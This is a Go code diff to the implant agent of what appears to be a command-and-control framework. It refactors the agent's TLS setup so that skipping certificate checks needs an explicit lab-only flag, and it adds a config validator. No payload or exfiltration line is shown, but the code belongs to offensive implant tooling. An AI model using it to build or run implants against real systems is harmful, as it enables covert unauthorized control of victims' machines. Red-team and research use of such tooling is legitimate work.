@@ -16,6 +16,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"runtime"
+	"strings"
 	"time"
 
 	"github.com/shardc2/shardc2/pkg/crypto"
@@ -28,14 +29,15 @@ const (
 )
 
 type Config struct {
-	ServerURL  string
-	ImplantKey string
-	PayloadKey []byte
-	CACert     string
-	Interval   time.Duration
-	Jitter     time.Duration
-	KillDate   time.Time
-	Profile    *profiles.Profile
+	ServerURL         string
+	ImplantKey        string
+	PayloadKey        []byte
+	CACert            string
+	InsecureTLSForLab bool
+	Interval          time.Duration
+	Jitter            time.Duration
+	KillDate          time.Time
+	Profile           *profiles.Profile
 }
 
 type Agent struct {
@@ -78,19 +80,12 @@ type serverCommand struct {
 func New(cfg Config) *Agent {
 	client := &http.Client{Timeout: 30 * time.Second}
 
-	if cfg.CACert != "" {
-		caCert, err := os.ReadFile(cfg.CACert)
-		if err == nil {
-			pool := x509.NewCertPool()
-			pool.AppendCertsFromPEM(caCert)
-			client.Transport = &http.Transport{
-				TLSClientConfig: &tls.Config{RootCAs: pool},
-			}
-		}
-	} else {
-		client.Transport = &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		}
+	tlsCfg, err := buildTLSConfig(cfg)
+	if err != nil {
+		log.Printf("[!] TLS config error: %v (falling back to system roots)", err)
+	}
+	if tlsCfg != nil {
+		client.Transport = &http.Transport{TLSClientConfig: tlsCfg}
 	}
 
 	if cfg.Interval == 0 {
@@ -104,6 +99,43 @@ func New(cfg Config) *Agent {
 	}
 
 	return &Agent{config: cfg, client: client}
+}
+
+func buildTLSConfig(cfg Config) (*tls.Config, error) {
+	if cfg.CACert != "" {
+		caCert, err := os.ReadFile(cfg.CACert)
+		if err != nil {
+			return nil, fmt.Errorf("read CA cert %s: %w", cfg.CACert, err)
+		}
+		pool := x509.NewCertPool()
+		if !pool.AppendCertsFromPEM(caCert) {
+			return nil, fmt.Errorf("failed to parse CA cert %s", cfg.CACert)
+		}
+		return &tls.Config{RootCAs: pool}, nil
+	}
+
+	if cfg.InsecureTLSForLab {
+		return &tls.Config{InsecureSkipVerify: true}, nil
+	}
+
+	if strings.HasPrefix(cfg.ServerURL, "http://") {
+		return nil, nil
+	}
+
+	return &tls.Config{}, nil
+}
+
+func ValidateTLSConfig(cfg Config) error {
+	if !strings.HasPrefix(cfg.ServerURL, "https://") {
+		return nil
+	}
+	if cfg.CACert != "" {
+		return nil
+	}
+	if cfg.InsecureTLSForLab {
+		return nil
+	}
+	return fmt.Errorf("HTTPS server requires --ca-cert or --insecure-tls-for-lab-only flag")
 }
 
 func (a *Agent) Run(ctx context.Context) error {
